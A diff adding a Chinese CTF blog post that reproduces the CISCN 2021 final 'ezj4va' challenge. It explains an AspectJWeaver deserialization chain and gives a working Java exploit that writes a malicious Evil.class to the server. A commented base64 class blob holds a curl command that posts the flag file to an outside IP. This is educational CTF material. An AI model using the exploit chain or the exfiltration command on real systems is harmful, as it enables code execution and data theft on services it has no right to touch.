@@ -1,0 +1,489 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>ciscn2021 finnal复现 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ciscn2021 finnal复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-24 12:46" pubdate>
+        2022年7月24日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      625 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      9
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ciscn2021 finnal复现</h1>
+            
+            <div class="markdown-body">
+              <h1 id="ciscn2021-finnal复现"><a href="#ciscn2021-finnal复现" class="headerlink" title="ciscn2021 finnal复现"></a>ciscn2021 finnal复现</h1><p>要打国赛finnal了，把去年的题抽时间做一做。</p>
+<h2 id="ezj4va"><a href="#ezj4va" class="headerlink" title="ezj4va"></a>ezj4va</h2><p>虽然源码看着很多，但是链子还是不是很难的。</p>
+<h3 id="关于AspectJWeaver反序列化"><a href="#关于AspectJWeaver反序列化" class="headerlink" title="关于AspectJWeaver反序列化"></a>关于AspectJWeaver反序列化</h3><p>首先来看链子，很明显还需要cc3.2依赖。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>put<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>write<span class="hljs-constructor">ToPath()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FileOutputStream</span>.</span></span>write<span class="hljs-literal">()</span><br></code></pre></div></td></tr></table></figure>
+<p>主要在于后面的链子，漏洞出发点在<code>SimpleCache$StorableCachingMap.writeToPath()</code>。writeToPath中key和value分别是文件名和内容。<br><img src="http://39.107.239.30:3000/uploads/7226ee9c-fe04-4d21-92a1-b624878a338d.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>org.aspectj.weaver.tools.cache.SimpleCache.StoreableCachingMap#put</code>中调用了writeToPath。所以反序列化的时候触发put方法就行了。<br><img src="http://39.107.239.30:3000/uploads/f942b3bc-7020-468c-9ee1-cb32af18f9ba.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个类接受两个参数，并且方法名为put。那就可以拼接上LazyMap的链子即可<br><img src="http://39.107.239.30:3000/uploads/5f0ad9a2-8e67-4f3f-a19a-6379d8b12c94.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>拖下来源码审计，/cart/*路由下有三个子处理，挑一个看就行了<br><img src="http://39.107.239.30:3000/uploads/6a304707-1dec-4cfa-b394-c16ecbf99bc4.png" srcset="/img/loading.gif" lazyload></p>
+<p>/cart/add最终是调用了addToCart函数。在这个函数里主动调用了put方法，并且反序列出来的cart类我们是可控的，所以直接将skuDescribe设置成<code>SimpleCache$StorableCachingMap</code>就行了<br><img src="http://39.107.239.30:3000/uploads/80009975-7bd5-4e3a-b027-bcb6313b3466.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用链变成</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CartServiceImpl</span>.</span></span>add<span class="hljs-constructor">ToCart()</span> <span class="hljs-comment">//反序列化成cart对象</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Deserializer</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CartServiceImpl</span>.</span></span>add<span class="hljs-constructor">ToCart()</span><span class="hljs-comment">//存在put方法</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>put<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>write<span class="hljs-constructor">ToPath()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FileOutputStream</span>.</span></span>write<span class="hljs-literal">()</span><br></code></pre></div></td></tr></table></figure>
+<p>exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.domain.Cart;<br><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.service.impl.CartServiceImpl;<br><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.utils.Deserializer;<br><span class="hljs-keyword">import</span> ciscn.fina1.ezj4va.utils.Evil;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getCookie</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">// 创建StoreableCachingMap对象</span><br>        Constructor&lt;?&gt; constructor = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Map&lt;String,Object&gt; map = (Map&lt;String, Object&gt;) constructor.newInstance(<span class="hljs-string">&quot;./target/classes&quot;</span>, <span class="hljs-number">123</span>);<br><br>        Cart cart = <span class="hljs-keyword">new</span> Cart();<br>        cart.setSkuDescribe(map);<br><br>        String oldCartStr = Deserializer.serialize(cart);<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Cart test= (Cart) Deserializer.deserialize(oldCartStr);</span><br><span class="hljs-comment">//        Map skuDescribe = test.getSkuDescribe();</span><br><span class="hljs-comment">//        System.out.println(skuDescribe.getClass().getName());</span><br><br>        <span class="hljs-keyword">return</span> oldCartStr;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NotFoundException, CannotCompileException </span>&#123;<br>        String fileName = <span class="hljs-string">&quot;Evil.class&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] exp = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br><span class="hljs-comment">//        String content = &quot;yv66vgAAADQALQoACwAYCgAZABoIABsKABkAHAcAHQgAHggAHwgAIAoAGQAhBwAiBwAjBwAkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACUBAApyZWFkT2JqZWN0AQAeKExqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOylWBwAmAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADQAOBwAnDAAoACkBAAhjYWxjLmV4ZQwAKgArAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEALWN1cmwgaHR0cDovLzM5LjEwNy4yMzkuMzA6MjMzMyAtRiBmaWxlPUAvZmxhZwwAKgAsAQAERXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAQAMAAAAAgABAA0ADgACAA8AAAAhAAEAAQAAAAUqtwABsQAAAAEAEAAAAAoAAgAAAAUABAAHABEAAAAEAAEAEgACABMAFAACAA8AAABEAAUAAgAAACS4AAISA7YABFe4AAIGvQAFWQMSBlNZBBIHU1kFEghTtgAJV7EAAAABABAAAAAOAAMAAAAJAAkACwAjAAwAEQAAAAQAAQAVAAEAFgAAAAIAFw==&quot;;</span><br><span class="hljs-comment">//        byte[] exp = Base64.getDecoder().decode(content);</span><br>        Cart cart = <span class="hljs-keyword">new</span> Cart();<br>        Map&lt;String,Object&gt; skuDescribe = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        skuDescribe.put(fileName,exp);<br>        cart.setSkuDescribe(skuDescribe);<br><br>        String payload = Deserializer.serialize(cart);<br>        Cart test = (Cart) Deserializer.deserialize(payload);<br>        <span class="hljs-keyword">for</span>(Map.Entry&lt;String,Object&gt; entry:test.getSkuDescribe().entrySet())&#123;<br><span class="hljs-comment">//            skuDescribe.put(entry.getKey(),entry.getValue());</span><br>            System.out.println(entry.getKey());<br>            System.out.println(entry.getValue());<br>        &#125;<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(String skus, String oldCartStr)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        CartServiceImpl.getInstance().addToCart(skus,oldCartStr);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception</span>&#123;<br>        String skus = getData();<br>        String Cookie = getCookie();<br>        System.out.println(<span class="hljs-string">&quot;String skus =  &quot;</span> + skus);<br>        System.out.println(<span class="hljs-string">&quot;String Cookie =  &quot;</span> + Cookie);<br>        test(skus,Cookie);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+<p>target/classes下写入Evil.class,然后反序列化这个类即可<br><img src="http://39.107.239.30:3000/uploads/a4a50e07-a43a-4165-98af-269f01c7b2c9.png" srcset="/img/loading.gif" lazyload><br>发送请求<br><img src="http://39.107.239.30:3000/uploads/3735ae06-2720-4cdd-a5cb-1115ead178b1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Patch修复"><a href="#Patch修复" class="headerlink" title="Patch修复"></a>Patch修复</h3><p>buu上环境有点问题回头再看看。</p>
+<h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>还没看</p>
+<h2 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h2><h2 id="iiNote"><a href="#iiNote" class="headerlink" title="iiNote"></a>iiNote</h2>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/24/2022-7-24-CISCN%202022%E5%88%9D%E8%B5%9B/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CISCN 2022初赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/24/2022-7-24-CISCN%20%E5%8D%8A%E5%86%B3%E8%B5%9B/">
+                        <span class="hidden-mobile">CISCN 半决赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
